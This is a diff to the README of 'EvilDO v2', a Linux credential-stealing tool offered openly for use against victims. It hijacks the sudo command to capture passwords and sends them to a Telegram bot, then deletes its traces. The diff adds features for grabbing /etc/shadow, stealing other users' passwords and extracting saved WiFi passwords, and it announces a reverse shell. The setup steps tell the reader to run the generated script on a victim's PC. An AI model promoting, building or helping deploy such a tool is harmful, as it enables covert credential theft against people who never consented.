@@ -1,4 +1,4 @@
-## EvilDO - Creditshifter for Linux systems
+## EvilDO v2 - Creditshifter for Linux systems
 A tool that simply sets alias to sudo command, then sends captured passwords and information to Telegram bot(created by BotFather) and then covers up all the traces.
 
 ![](assets/screenshot.png)
@@ -10,11 +10,16 @@ A tool that simply sets alias to sudo command, then sends captured passwords and
 - Steals user passwords and sends them to a Telegram bot  
 - If there is no internet connection, it disguises itself as a sudo command to prevent data loss  
 - After stealing the passwords, the script covers its tracks and deletes all associated files
+The script can now be configured to run with root privileges. Available features:
+- Extracting /etc/passwd and /etc/shadow files
+- Attempt a password steal for all users in /home directory
+- Retrieving WiFi configuration files (including saved passwords)
+
+For more details, press 'i' when selecting a specific option in the script.
 
 ### Coming soon
 
-- Reverse shell (long polling)
-- /etc/passwd + /etc/shadow grabbing (if root)
+- Reverse shell (v3) 
 - SSH setting
 
 ### Setup 
@@ -57,7 +62,8 @@ If everything is ok, you will recieve a test message
 
 ![](assets/setup/6.png)
 
-Then, return to the terminal, it should create another script - 'evildo.sh'. You should execute it on victim's PC, and all the gathered information will be in your Telegram bot.
+Then, return to the terminal and choose the desired options. For a detailed description, simply type 'i' for each—this will display additional information. 
+After configuration, it should create another script - 'evildo.sh'. You should execute it on victim's PC, and all the gathered information will be in your Telegram bot.
 
 **Warning:** if password contains the '+' symbol, then '+' will be replaced with '(plus_symbol)' because telegram API doesn't support it as regular symbol.
 
